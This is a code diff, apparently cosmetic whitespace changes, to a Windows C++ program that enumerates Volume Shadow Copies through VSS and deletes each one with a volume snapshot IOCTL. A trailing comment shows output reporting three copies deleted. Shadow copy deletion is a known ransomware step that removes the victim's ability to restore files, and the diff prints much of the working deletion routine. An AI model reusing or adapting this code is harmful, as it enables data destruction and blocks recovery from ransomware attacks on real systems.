@@ -36,10 +36,10 @@ typedef struct _VOLSNAP_DELETE_SNAPSHOT
 
 BOOL DeleteShadowCopiesViaIoctl(IN LPCWSTR pwszBackedVol, IN LPCWSTR pwszSnapDevice) {
 
-	VOLSNAP_DELETE_SNAPSHOT 	VolSnapDeleteSnapshot	= { 0 };
-	HANDLE						hVolume					= INVALID_HANDLE_VALUE;
-	DWORD						dwBytesReturned			= 0x00;
-	BOOL 						bResult					= TRUE;
+	VOLSNAP_DELETE_SNAPSHOT 	VolSnapDeleteSnapshot		= { 0 };
+	HANDLE				hVolume				= INVALID_HANDLE_VALUE;
+	DWORD				dwBytesReturned			= 0x00;
+	BOOL 				bResult				= TRUE;
 
 	VolSnapDeleteSnapshot.uShadowCopyVolumeNameLen = (USHORT)(lstrlenW(pwszSnapDevice) * sizeof(WCHAR));
 	RtlCopyMemory(VolSnapDeleteSnapshot.szShadowCopyVolume, pwszSnapDevice, VolSnapDeleteSnapshot.uShadowCopyVolumeNameLen + sizeof(WCHAR));
@@ -65,8 +65,8 @@ BOOL DeleteShadowCopiesViaIoctl(IN LPCWSTR pwszBackedVol, IN LPCWSTR pwszSnapDev
 BOOL EnumerateShadowCopiesViaVssAndDeleteViaIoctl(OUT OPTIONAL PDWORD pdwNumberOfCopiesDeleted) {
 
 	CComPtr<IVssBackupComponents>   m_VssBackupObj		= NULL;
-	CComPtr<IVssEnumObject>			m_VssEnumObj		= NULL;
-	HRESULT							hResults			= S_OK;
+	CComPtr<IVssEnumObject>		m_VssEnumObj		= NULL;
+	HRESULT				hResults		= S_OK;
 
 	if ((hResults = CoInitialize(NULL)) != S_OK) {
 		printf("[!] CoInitialize Failed With Error: 0x%0.8X \n", hResults);
@@ -115,16 +115,15 @@ BOOL EnumerateShadowCopiesViaVssAndDeleteViaIoctl(OUT OPTIONAL PDWORD pdwNumberO
 
 	while (TRUE)
 	{
-		VSS_OBJECT_PROP		VssObjectProp				= {  };
-		VSS_SNAPSHOT_PROP&  VssSnapshotProp				= VssObjectProp.Obj.Snap;
+		VSS_OBJECT_PROP			VssObjectProp				= {  };
+		VSS_SNAPSHOT_PROP&  		VssSnapshotProp				= VssObjectProp.Obj.Snap;
 		ULONG				uFetchedCopiesNmbr			= 0x00;
 		LPCWSTR				pwszFullSnapDev				= NULL;
 		LPCWSTR				pwszStartDev				= NULL;
-		WCHAR				wszSnapDevice[MAX_PATH]		= { 0 };
-		WCHAR				wszBackedVol[MAX_PATH]		= { 0 };
-		INT					wszBackedVolLen				= 0x00;
-		LPCWSTR				pwszOrigVol					= NULL;
-
+		WCHAR				wszSnapDevice[MAX_PATH]			= { 0 };
+		WCHAR				wszBackedVol[MAX_PATH]			= { 0 };
+		INT				wszBackedVolLen				= 0x00;
+		LPCWSTR				pwszOrigVol				= NULL;
 
 		if ((hResults = m_VssEnumObj->Next(0x01, &VssObjectProp, &uFetchedCopiesNmbr)) != S_OK) {
 
@@ -139,8 +138,8 @@ BOOL EnumerateShadowCopiesViaVssAndDeleteViaIoctl(OUT OPTIONAL PDWORD pdwNumberO
 			goto _END_OF_FUNC;
 		}
 
-		pwszFullSnapDev		= VssSnapshotProp.m_pwszSnapshotDeviceObject;
-		pwszStartDev		= wcsstr(pwszFullSnapDev, L"\\Device\\");
+		pwszFullSnapDev	= VssSnapshotProp.m_pwszSnapshotDeviceObject;
+		pwszStartDev	= wcsstr(pwszFullSnapDev, L"\\Device\\");
 
 		if (!pwszStartDev)
 		{
@@ -171,7 +170,6 @@ BOOL EnumerateShadowCopiesViaVssAndDeleteViaIoctl(OUT OPTIONAL PDWORD pdwNumberO
 
 		VssFreeSnapshotProperties(&VssSnapshotProp);
 	}
-
 
 _END_OF_FUNC:
 	return (hResults == S_OK || hResults == VSS_E_OBJECT_NOT_FOUND) ? TRUE : FALSE;
@@ -216,3 +214,4 @@ int main()
 [i] No More Shadow Copies Were Detected
 [+] Successfully Deleted [ 3 ] Shadow Copies
 */
+
